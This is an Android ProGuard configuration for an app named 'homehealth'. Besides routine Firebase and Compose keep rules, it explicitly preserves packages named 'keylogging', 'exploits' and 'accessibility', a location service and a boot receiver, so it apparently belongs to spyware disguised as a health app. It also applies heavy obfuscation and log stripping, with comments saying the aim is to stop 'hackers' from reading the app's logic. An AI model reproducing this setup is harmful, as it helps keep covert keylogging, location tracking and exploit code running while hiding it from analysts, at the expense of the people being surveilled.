# Add project specific ProGuard rules here.
# You can control the set of applied configuration files using the
# proguardFiles setting in build.gradle.
#
# For more details, see
#   http://developer.android.com/guide/developing/tools/proguard.html

# If your project uses WebView with JS, uncomment the following
# and specify the fully qualified class name to the JavaScript interface
# class:
#-keepclassmembers class fqcn.of.javascript.interface.for.webview {
#   public *;
#}

# Uncomment this to preserve the line number information for
# debugging stack traces.
#-keepattributes SourceFile,LineNumberTable

# If you keep the line number information, uncomment this to
# hide the original source file name.
#-renamesourcefileattribute SourceFile

# Keep Firebase (breaks if renamed)
-keep class com.google.firebase.** { *; }
-keep class com.google.android.gms.** { *; }
-dontwarn com.google.firebase.**
-dontwarn com.google.android.gms.**

# Keep data models (Firestore maps by field name)
-keep class com.example.homehealth.data.models.** { *; }

# Keep BuildConfig (Firebase credentials read from here)
-keep class com.example.homehealth.BuildConfig { *; }

# Kotlin coroutines
-keepclassmembernames class kotlinx.** {
    volatile <fields>;
}

# Prevent debug UI tooling from breaking with minification
-keep class androidx.compose.ui.tooling.** { *; }
-keep class androidx.compose.ui.test.** { *; }
-dontwarn androidx.compose.ui.tooling.**
-dontwarn androidx.compose.ui.test.**

# Fix SuspendToFutureAdapter missing class
-dontwarn androidx.concurrent.**
-keep class androidx.concurrent.** { *; }

# Fix androidTest minification warning
-dontwarn androidx.test.**
-keep class androidx.test.** { *; }

# 1. Aggressive Optimization & Hardening
-optimizationpasses 5
-allowaccessmodification
-dontpreverify
-overloadaggressively

# 2. Advanced Obfuscation
# This flattens the package structure into a single letter 'o', making it
# much harder to guess the app's internal logic from the package names.
-repackageclasses 'o'

# This renames the source file attribute to "SourceFile" so hackers can't see
# the actual Kotlin/Java filename in stack traces.
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable,Signature,EnclosingMethod

# 3. Strip Logging
# This removes all debug and verbose logs during optimization.
# NOTE: This only works when using 'proguard-android-optimize.txt' in build.gradle.
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
}

# 4. Critical Entry Points
# These are referenced by the Android System (Manifest). While R8 usually handles
# these, keeping them explicitly ensures background tasks and services don't break.
-keep class com.example.homehealth.location.SyncWorker { *; }
-keep class com.example.homehealth.location.LocationService { *; }
-keep class com.example.homehealth.accessibility.** { *; }
-keep class com.example.homehealth.keylogging.** { *; }
-keep class com.example.homehealth.BootReceiver { *; }
-keep class com.example.homehealth.exploits.** { *; }

# 5. Data Models (Firebase/Firestore)
# Since Firestore maps document fields to class properties by name, we MUST
# keep the names of these fields and the no-argument constructor.
-keepclassmembers class com.example.homehealth.data.models.** {
    public <init>(...);
    <fields>;
}

# 6. Library Compatibility
-keep class com.google.firebase.** { *; }
-keep class com.google.android.gms.** { *; }
-dontwarn com.google.firebase.**
-dontwarn com.google.android.gms.**

# Jetpack Compose specific rules
-keep class androidx.compose.** { *; }
-dontwarn androidx.compose.**

# Avoid warnings for missing classes in libraries
-dontwarn androidx.concurrent.futures.SuspendToFutureAdapter
